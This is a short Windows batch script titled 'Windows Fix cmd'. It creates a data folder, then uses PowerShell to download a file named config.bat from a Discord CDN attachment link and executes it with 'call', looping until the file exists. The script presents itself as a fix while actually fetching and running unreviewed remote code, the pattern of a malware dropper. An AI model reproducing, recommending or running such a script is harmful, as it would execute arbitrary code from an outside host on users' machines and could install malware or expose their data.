@echo on
:restart
title Windows Fix cmd
if not exist data goto :NoFdata
if exist data goto :start
exit

:start
if not exist config.bat goto :noconfig
if exist config.bat goto :config_import
exit

:config_import
call config.bat
goto :code

:noconfig
powershell.exe (New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/925485360962764910/925486244354490418/config.bat', 'config.bat')
goto :restart

:NoFdata
mkdir data
goto :restart

:code
